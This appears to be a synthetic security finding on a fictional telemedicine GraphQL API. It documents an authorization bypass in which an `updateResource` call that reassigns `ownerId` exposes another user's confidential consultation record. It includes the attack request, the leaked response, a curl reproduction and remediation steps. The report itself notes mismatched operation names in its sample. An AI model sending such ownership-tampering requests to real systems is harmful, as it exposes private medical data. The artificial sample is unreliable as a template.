# Security Analysis Report
**System:** TeleCare Consultation API
**Domain:** Telemedicine / Remote Consultation
**Example ID:** GQL-0286
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | HIGH | BOLA — Pattern 10.5 | Draft / non-published resource access on `updateResource` — attacker reads unpublished/draft telemedicine consultation records |

---

## Finding 1 — BOLA: Draft/Non-Published Resource Access via Mutation Input (Pattern 10.5)

### Summary
The GraphQL API at `https://api.telecare-consultatio.example.com/graphql` exposes an `updateResource` mutation that allows the attacker to access draft/unpublished telemedicine consultation records. The server response returns data for `other-user-1383283b` under the `getResource` key (see inconsistency note below).

**Context.txt inconsistency (documented):** The HAR request uses `updateResource(id: "R-2286", input: {status: "approved", ownerId: "attacker-1383283b"})` (mutation), while the HAR response returns data under the key `getResource` (read). These names conflict. Both are faithfully reproduced here.

**Note:** `x-request-id: req-1383283b` is a server-assigned response header; it does not appear in the outgoing request.

**Pattern:** 10.5 — Draft / non-published resource access
**Affected endpoint:** `POST https://api.telecare-consultatio.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack (mutation)**
```
POST https://api.telecare-consultatio.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json

{"query":"query VulnerableOp { updateResource(id: \"R-2286\", input: {status: \"approved\", ownerId: \"attacker-1383283b\"}) { resourceId status } }"}
```

**Response — Victim Telemedicine Consultation Record**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-283b",
      "ownerId": "other-user-1383283b",
      "data": {
        "sensitiveField": "CONFIDENTIAL-1383283b",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

### Steps to Reproduce
```bash
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
curl -s -X POST "https://api.telecare-consultatio.example.com/graphql" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { updateResource(id: \"R-2286\", input: {status: \"approved\", ownerId: \"attacker-1383283b\"}) { resourceId status } }"}'
# Vulnerable: tenantId: tenant-283b, sensitiveField: CONFIDENTIAL-1383283b
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. Draft/unpublished records must enforce publication-state + ownership access control.
2. Remove `ownerId` and `tenantId` from writable mutation inputs.
3. Resolver must verify `object.tenantId` matches JWT `tenantId` claim.
